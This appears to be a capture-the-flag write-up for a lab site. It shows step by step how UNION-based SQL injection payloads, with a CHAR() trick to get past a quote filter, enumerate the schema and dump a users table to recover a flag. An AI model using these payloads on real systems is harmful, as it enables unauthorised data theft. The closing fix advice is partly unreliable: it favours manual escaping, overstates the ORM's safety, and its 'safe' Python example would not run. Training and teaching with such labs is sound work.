# Breach: SQL injection basic


<br>

### >> [Flag file](../flag) <<

<br>


## Explanation:


#### Step 1:

- Go to the members page.

> You'll notice, by entering random data, that the form is vulnerable to SQL injection.

> You guess that the SQL query is something like this:
> ```sql
> SELECT first_name_column, surname_column FROM some_user_table WHERE id_column={the payload you enter};
> ```

> 1. You know that the query is returning a 2 columns result.
> 2. You know that the verification is very poorly protected.

> Conclusion, we can explore the database !


#### Step 2:

Let's explore the database !

> We want to get only the wanted/interesting info, <br>
> So we'll search for a non-existing user id (for exemple `999`) <br>
> And we'll use the UNION operator to add a second query to the first one. <br>

> With the payload `999 UNION ...`, the query will look like this:
> ```sql
> SELECT first_name_column, surname_column FROM some_user_table WHERE id_column=999 UNION ...;
> ```

> There is a special part of the db called `INFORMATION_SCHEMA` that contains tables listing all the information about the database. <br>
> For this exercise, we'll use `INFORMATION_SCHEMA.TABLES` and `INFORMATION_SCHEMA.COLUMNS`, but there are many more interesting tables in `INFORMATION_SCHEMA` !

- List all the tables in the database:
```sql
999 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
```


#### Step 3:

The table `users` looks interesting, let's see what's inside...

> The quotes (`'` and `"`) are filtered, but we can use the `CHAR()` function to bypass this filter.

- Translate `users` and `Member_Sql_Injection` to their ASCII values:
```sql
CHAR(117, 115, 101, 114, 115)
CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110)
```

- List all the columns in the `users` table:
```sql
999 UNION SELECT COLUMN_NAME, COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_SCHEMA=CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110)
AND TABLE_NAME=CHAR(117, 115, 101, 114, 115)
```

> It gives us the culumns:
> | COLUMN_NAME  | COLUMN_TYPE  |
> | -----------: | :----------- |
> | user_id      | int(11)      |
> | first_name   | varchar(255) |
> | last_name    | varchar(255) |
> | town         | varchar(255) |
> | country      | varchar(255) |
> | planet       | varchar(255) |
> | Commentaire  | varchar(255) |
> | countersign  | varchar(255) |


#### Step 4:

Now we can get the flag from the `users` table.

- List every users:
```sql
999 UNION SELECT user_id, first_name FROM users
```

> Oh ! The user with the id `5` is named `Flag`, let's see if we can get the flag from his account.

- Get the flag:
```sql
999 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5
```

> We get:
> - Decrypt this password -> then lower all the char. Sh256 on it and it's good !
> - 5ff9d0165b4f92b14994e5c685cdce28

--- 

Another way:

- We can list everything:
```sql
999 UNION SELECT user_id, first_name FROM users
UNION SELECT user_id, last_name FROM users
UNION SELECT user_id, town FROM users
UNION SELECT user_id, country FROM users
UNION SELECT user_id, planet FROM users
UNION SELECT user_id, Commentaire FROM users
UNION SELECT user_id, countersign FROM users
```

> It gives us:
> | user_id | first_name | last_name | town      | country  | planet | Commentaire                                                                   | countersign                      |
> | :-----: | :--------- | :-------- | :-------- | :------- | :----- | :---------------------------------------------------------------------------- | :------------------------------- |
> | 1       | one        | me        | Paris     | France   | EARTH  | Je pense, donc je suis                                                        | 2b3366bcfd44f540e630d4dc2b9b06d9 |
> | 2       | two        | me        | Helsinki  | Finlande | Earth  | Aamu on iltaa viisaampi.                                                      | 60e9032c586fb422e2c16dee6286cf10 |
> | 3       | three      | me        | Dublin    | Irlande  | Earth  | Dublin is a city of stories and secrets.                                      | e083b24a01c483437bcf4a9eea7c1b4d |
> | 5       | Flag       | GetThe    | 42        |          |        | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |


#### Step 5:

- Decrypt the password (md5 lookup): `5ff9d0165b4f92b14994e5c685cdce28` -> `FortyTwo`

- Lower all the characters: `FortyTwo` -> `fortytwo`

- Sh256 on it: `fortytwo` -> `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`


<br>


## How to fix it:

- Use a code interface instead of SQL querries.<br>
  For exemple, with django, the interaction with the database are object-based.<br>
  It just means that instead of :
  ```py
  sql_manager.query("SELECT * FROM Users WHERE id=" + var)  # not safe
  ```
  We now have :
  ```py
  Users.get(id=var)  # almost unbreakable
  ```
  It's injection-free and with some conditions, absolutely unbreakable.

<br>

- Or at least, Check the input before applying the query.<br>
  Example :<br>
  ```py
  try:
      safe_var = int(var)
      if 0 <= safe_var < 1000:
          sql_manager.query("SELECT * FROM Users WHERE id=" + safe_var)  # safe
      else:
          pass  # out of bounds
  except:
      pass  # not a number (may be an injection tentative)
  ```
  And in case the variable is a string, keep it in simple quotes,<br>
  escaping the backslashes and the simple quotes :<br>
  ```py
  safe_var = var.replace("\\", "\\\\").replace("'", "\\'")
  sql_manager.query("SELECT * FROM Users WHERE name='" + safe_var + "'")
  ```

<br>

- And anyway, Keep everything up-to-date !


---

[[Back to main page](/#darkly)]
